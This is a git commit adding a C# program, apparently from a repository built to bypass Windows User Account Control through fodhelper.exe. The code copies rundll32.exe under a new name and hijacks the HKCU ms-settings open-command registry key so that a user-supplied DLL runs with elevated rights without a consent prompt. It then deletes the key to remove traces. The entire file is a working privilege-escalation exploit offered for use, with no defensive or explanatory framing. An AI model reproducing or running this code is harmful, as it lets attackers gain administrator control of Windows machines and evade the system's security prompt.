40a4078eb5c15c370fd9de6da8f0914da65e586b
l00sy4 <142809264+l00sy4@users.noreply.github.com>
2023-11-29 19:14:39 +0200

    Add files via upload

---
+++ Bypassing-UAC-wIth-FodHelper/FodHelper-DLL/FodHelper-DLL/Program.cs
@@ -0,0 +1,38 @@
+﻿using System.Diagnostics;
+using Microsoft.Win32;
+
+class Program
+{  
+    static void Main(string[] args)
+    {
+        if (args.Length == 0)
+        {
+            Console.WriteLine("Please specify the full path to your DLL");
+            return;
+        }
+
+        string dllPath = args[0];
+        string Payload = $"C:\\temp\\luci {dllPath}";
+        FodHelper(Payload);
+    }
+
+    static void FodHelper(string Payload)
+    {
+        // Copy C:\windows\system32\rundll32.exe to C:\temp\luci.exe
+        File.Copy(@"C:\windows\system32\rundll32.exe", @"C:\temp\luci.exe");
+
+        // Create Registry Structure
+        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\command"))
+        {
+            key.SetValue("", Payload, RegistryValueKind.String);
+            key.SetValue("DelegateExecute", "", RegistryValueKind.String);
+        }
+
+        // Start fodhelper.exe
+        Process.Start(@"C:\Windows\System32\fodhelper.exe");
+
+        // Cleanup
+        System.Threading.Thread.Sleep(3000);
+        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings");
+    }
+}
